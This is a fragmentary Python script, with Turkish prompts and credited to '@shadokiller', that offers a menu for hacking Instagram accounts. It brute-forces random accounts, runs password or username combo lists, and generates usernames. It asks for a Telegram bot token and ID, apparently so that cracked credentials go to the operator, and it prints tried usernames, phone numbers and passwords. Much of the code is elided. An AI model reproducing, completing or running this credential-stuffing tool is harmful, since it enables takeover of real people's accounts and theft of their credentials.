...
a=0
c=0
Token = input(f"{X}[{F}+{X}]{C} Telegram Botunuzun {Z}Tokenini {C}Giriniz :- {Z}")
Id = input(f"{X}[{F}+{X}]{C} Telegram Hesabinizin {Z}ID {C}Numarasini Giriniz :- {Z}")
system('clear')
def Login():
...
*••••••••••••••••••••••••••••••••••••••*''')
		...
		b+=1
		print(Z+"Basarisiz Hesap {}==> Telefon Numarasi {}:- {} {}| Sifre {}:- {}".format(B,Z,user,B,Z,pas)+C+" :- "+str(b))
def Combo_User():
	ch = input(f'{X}[{F}={X}] {B} Kac Haneli Olsun :- {Z}')
	cu = input(f'{X}[{F}={X}] {B} Kac Adet Uretilsin :- {Z}')
...
*••••••••••••••••••••••••••••••••••••••*''')
				...
				b+=1
				print(Z+"Basarisiz Hesap {}==> Kullanici Adi {}:- {} {}| Sifre {}:- {}".format(B,Z,user,B,Z,pas)+C+" :- "+str(b))
		except requests.exceptions.ConnectionError:
			sleep(6)

def Login_k():
	global Z,X,Z1,F,A,j,C,B,Y,E,b,a,c
	user = input(f"{F}[{Z}={F}]{C}Kullanici Adi Giriniz :- "+B)
	file = input(f"{F}[{Z}={F}]{C}Combo Dosyasinin Adini Giriniz :- ")
...
def jalan(z):
 for e in z + '\n':
  ...
  time.sleep(3/1000)
jalan(rh)
print(C+f"Takip et :\n{Z}Telegram Hesabim :- {F}@shadokiller\n{Z}İnstagram Hesabim :- {F}shadoxyedek")
print(C+"="*58)
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(0.006)
jalan(f'''{Z}({F}1{Z}) {B}Rastgele İnstagram Hesaplari Hackle {Z}•\n{Z}({F}2{Z}) {B}Sifre Combosu Kullanarak İnstagram Hackle {Z}•\n{Z}({F}3{Z}) {B}Kullanici Adi Combo Kullanarak İnstagram Hesabi Hackle {Z}•\n{Z}({F}4{Z}) {B}Kullanici Adi Olustur {Z}•''')
print(C+"_"*58)
Alaa = input(f"{F}[{Z}-{F}] {X}Hangisini Calistirayim :- {C}")
if Alaa == '1':
	system('clear')
	print(X+"Tool Baslatiliyor..")
	sleep(2)
	while True:
		try:
			Login()
